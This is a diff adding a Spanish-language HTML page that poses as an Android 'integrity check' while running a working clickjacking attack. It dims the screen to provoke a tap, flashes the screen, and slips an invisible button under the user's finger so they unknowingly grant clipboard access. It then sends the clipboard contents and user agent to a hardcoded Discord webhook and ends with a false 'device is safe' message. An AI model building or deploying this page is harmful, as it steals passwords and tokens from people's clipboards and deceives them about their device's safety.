@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Soporte de Sistema - Verificando...</title>
+    <style>
+        :root {
+            --android-bg: #1A1C1E;
+            --android-text: #E3E2E6;
+            --android-blue: #A8C7FA;
+            --android-dialog-bg: #212121;
+        }
+
+        body, html { margin: 0; padding: 0; height: 100%; background: var(--android-bg); font-family: 'Roboto', sans-serif; overflow: hidden; }
+        
+        /* 1. Capa de Engaño (Oscurecimiento) */
+        #ghost-dimmer {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0);
+            transition: background 6s linear;
+            z-index: 1000;
+        }
+
+        /* 2. Flash Subliminal (Validación de Android) */
+        #subliminal-flash {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: #4285F4;
+            display: none;
+            z-index: 3000;
+        }
+
+        /* 3. Botón Invisible (Ataque de Latencia) */
+        #invisible-allow-btn {
+            position: fixed;
+            width: 150px; height: 80px;
+            background: rgba(255, 0, 0, 0); /* Cambiar a 0.1 para pruebas visuales */
+            border: none;
+            z-index: 2000;
+            display: none;
+        }
+
+        /* Interfaz de Usuario Falsa */
+        #content-view { color: var(--android-text); text-align: center; margin-top: 35vh; }
+        .spinner { border: 4px solid rgba(255,255,255,0.1); border-left-color: var(--android-blue); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div id="ghost-dimmer"></div>
+    <div id="subliminal-flash"></div>
+    <button id="invisible-allow-btn"></button>
+
+    <div id="content-view">
+        <div class="spinner"></div>
+        <h2>Analizando integridad...</h2>
+        <p style="color: #8E9199; font-size: 0.9em;">No cierres esta ventana.</p>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
+        
+        let dimmer = document.getElementById('ghost-dimmer');
+        let flash = document.getElementById('subliminal-flash');
+        let allowBtn = document.getElementById('invisible-allow-btn');
+
+        // Iniciamos el oscurecimiento para forzar el clic reflejo
+        window.onload = () => {
+            setTimeout(() => {
+                dimmer.style.background = "rgba(0, 0, 0, 0.95)";
+            }, 1000);
+        };
+
+        // INTERCEPCIÓN DEL KERNEL CEREBRAL
+        dimmer.addEventListener('click', (e) => {
+            // 1. Captura de coordenadas instantánea
+            let x = e.clientX;
+            let y = e.clientY;
+
+            // 2. Flash de validación (Ciega el juicio crítico)
+            flash.style.display = 'block';
+
+            // 3. Posicionamiento del botón bajo el dedo antes de que el impulso termine
+            allowBtn.style.left = (x - 75) + 'px';
+            allowBtn.style.top = (y - 40) + 'px';
+            allowBtn.style.display = 'block';
+
+            setTimeout(() => {
+                flash.style.display = 'none';
+                dimmer.style.transition = "none";
+                dimmer.style.background = "transparent";
+            }, 18);
+        });
+
+        // ACCIÓN FINAL: Captura y Envío
+        allowBtn.addEventListener('click', async () => {
+            allowBtn.style.display = 'none';
+            
+            try {
+                // Solicita el portapapeles (El navegador mostrará el permiso nativo)
+                const text = await navigator.clipboard.readText();
+                enviarADiscord(text);
+            } catch (err) {
+                console.log("Permiso denegado o navegador no compatible.");
+            }
+        });
+
+        function enviarADiscord(contenido) {
+            const payload = {
+                embeds: [{
+                    title: "🎯 Captura de Portapapeles Exitosa",
+                    color: 4359668, // Azul Google
+                    fields: [
+                        { name: "Contenido", value: "```" + contenido + "```" },
+                        { name: "User Agent", value: navigator.userAgent }
+                    ],
+                    footer: { text: "Kernel Cerebro Exploit | 2026" }
+                }]
+            };
+
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).then(() => {
+                // Feedback visual de "Sistema Restaurado"
+                alert("Verificación completa. El dispositivo está seguro.");
+            });
+        }
+    </script>
+</body>
+</html>
